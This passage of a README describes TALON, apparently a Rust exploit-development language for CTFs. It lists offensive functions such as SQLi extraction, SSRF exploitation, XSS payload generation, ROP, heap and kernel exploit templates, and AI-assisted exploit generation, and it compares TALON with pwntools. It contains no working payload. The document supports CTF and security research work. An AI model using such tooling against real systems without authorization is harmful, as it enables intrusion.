- `scan_for_integer_overflow(source)` - Integer issues
- `scan_for_access_control(source)` - Access control
- `parse_abi_json(path)` - Parse ABI
- `call_ethereum_node(url, data)` - EVM call
- `get_balance(address)` - Get ETH balance
- `scan_for_flashloan_attacks(source)` - Flashloan
- `scan_for_oracle_manipulation(source)` - Oracle issues
- `scan_for_mev_vulnerabilities(source)` - MEV

### Web Security

- `web_scan(url, tests)` - Automated scan
- `sqli_test(url)` - SQL injection test
- `sqli_extract(url, table, columns)` - SQLi extraction
- `xss_scan(url, param)` - XSS detection
- `xss_payload_generator(type, objective)` - XSS payload
- `ssrf_test(url)` - SSRF test
- `ssrf_exploit(url, target)` - SSRF exploitation

### Fuzzing

- `fuzz_binary(target, seed, iterations)` - Coverage fuzzing
- `differential_fuzz(impl1, impl2, corpus)` - Differential
- `taint_analysis(binary, source, sinks)` - Taint tracking
- `detect_info_leaks(binary)` - Information leaks
- `analyze_crash(binary, input)` - Crash analysis
- `check_exploitability(crash_info)` - Exploitability

### Forensics

- `list_processes(memory_dump)` - Process listing
- `extract_strings(memory_dump, min_length)` - String extraction
- `parse_registry_hive(hive)` - Registry parsing
- `carve_files(image, types)` - File carving
- `stego_extract(image, method)` - Steganography extraction
- `stego_analyze(image)` - Entropy analysis

### GDB Integration

- `gdb_run(binary)` - Run and analyze
- `gdb_run_with_input(binary, input)` - With input
- `gdb_run_args(binary, args)` - With args
- `gdb_get_registers(binary)` - Extract registers
- `gdb_get_backtrace(binary)` - Get backtrace

### Flag Management

- `flag_search(data)` - Search for flags
- `flag_search_custom(data, pattern)` - Custom pattern
- `flag_search_file(path)` - Search file
- `flag_search_dir(directory)` - Search directory
- `flag_submit(url, flag)` - Submit flag
- `flag_submit_ctfd(url, flag, challenge_id, token)` - CTFd

### Templates

- `get_template(name, args)` - Get exploit template
- Templates: `shell`, `buffer-overflow`, `rop-chain`, `ret2libc`, `stack-pivot`, `sigrop`, `one-gadget`, `heap-spray`, `tcache-poison`, `fastbin-dup`, `house-of-orange`, `house-of-io`, `fmt-leak`, `fmt-write`, `fmt-rop`, `kernel-exploit`

### AI Assistance

- `ai_generate_exploit(type, arch, technique)` - Generate exploit
- `ai_analyze_binary(binary)` - Binary analysis
- `ai_suggest_bypass(mitigations)` - Bypass suggestions

---

## Why TALON for CTFs and Exploit Development

### Advantages over pwntools

- **Structured Syntax**: Less verbose than Python for common operations
- **Built-in ROP Gadget Finding**: Capstone-based gadget search integrated
- **Type Safety**: Catch errors at parse time, not runtime
- **Template System**: Quick-start templates for common exploit types
- **Better Error Messages**: Helpful suggestions for common mistakes
- **Integrated Binary Analysis**: goblin + Capstone built-in
- **Libc Database**: Native libc.rip integration
- **Auto-Offset**: Automatic buffer overflow offset finding
- **100x Faster**: Compiled Rust vs interpreted Python

### Comparison

**pwntools (Python):**
```python
from pwn import *
conn = remote('target', 1337)
conn.sendline(cyclic(200))
conn.interactive()
```

**TALON:**
```talon
let s = connect("target", 1337)
sendline(s, cyclic(200))
interactive(s)
```

### When to Use TALON

- CTF competitions requiring structured code
- Learning binary exploitation with stricter syntax
- Projects needing reproducible exploit scripts
- Teams wanting type-safe collaboration
- Performance-critical exploitation
- Modern heap exploitation (glibc 2.23+)
- Kernel exploitation automation
- Smart contract auditing

### When to Use pwntools

- Quick one-off exploits
- Python ecosystem integration
- Massive community support
- Mature documentation
- Legacy heap techniques

---

## Current Limitations

### Skill Level Required: Intermediate to Advanced

**You Still Need to Understand:**
- Binary exploitation fundamentals (buffer overflows, ROP, heap)
- Assembly language and memory layouts
- Protection mechanisms (NX, PIE, ASLR, canaries, RELRO)
- Debugging and reverse engineering techniques
- Target application behavior and vulnerability analysis

**TALON Does NOT:**
- Automatically find vulnerabilities
- Generate complete exploits without user expertise
- Replace understanding of exploitation mechanics
- Bypass modern mitigations automatically
- Provide "push-button" exploitation

**TALON DOES:**
- Automate ROP gadget finding with constraints
- Generate shellcode for common platforms
- Provide structured syntax for exploit primitives
- Integrate binary analysis tools (Capstone, goblin, Z3)
- Handle common boilerplate (packing, socket management)
- Identify libc versions automatically
- Find buffer overflow offsets
- Provide 16 exploit templates

---

## Documentation

- `help()` - Interactive documentation in REPL
- `help(search: "keyword")` - Search functions
- `examples` - Code examples in REPL
- `cheatsheet` - Syntax reference
- `man talon` - Main manual page
- `man talon-<topic>` - Topic-specific documentation
- [GitHub Repository](https://github.com/ridpath/talon)
- [BUILTIN_FUNCTIONS_REFERENCE.md](BUILTIN_FUNCTIONS_REFERENCE.md) - Complete function reference

---

## Contributing

Contributions welcome! Focus areas:

- Additional shellcode architectures
- More ROP chain strategies
- Binary format parsers (ELF, PE, Mach-O)
- Fuzzing engines
- Heap exploitation techniques
- Kernel exploit modules
- Smart contract vulnerability detectors
- Web security scanners
- Test coverage
- Documentation improvements

**Development:**

```bash
# Clone and build
git clone https://github.com/ridpath/talon.git
cd talon
cargo build

# Run tests
cargo test

# Run linter
cargo clippy

# Format code
cargo fmt
```

---

## License

MIT License - See LICENSE file for details

---

## Security Notice

This tool is designed for:
- Authorized security testing
- CTF competitions
- Educational purposes
- Security research

Users are responsible for ensuring their use complies with applicable laws and regulations. Unauthorized access to computer systems is illegal.

---

## Acknowledgments

Built with:
- Rust ecosystem (pest, tokio, capstone, goblin, etc.)
- Inspired by pwntools, radare2, and Metasploit
- CTF community feedback
- Z3 theorem prover
- LLVM compiler infrastructure

---

## Repository

**GitHub**: https://github.com/ridpath/talon

**Status**: Active development | **Last Updated**: January 2026 | **Version**: 0.1.0-alpha | **Phase**: 23

**Production-ready**: 138 modules, 250+ built-in functions, 16 exploit templates, 0 compilation errors
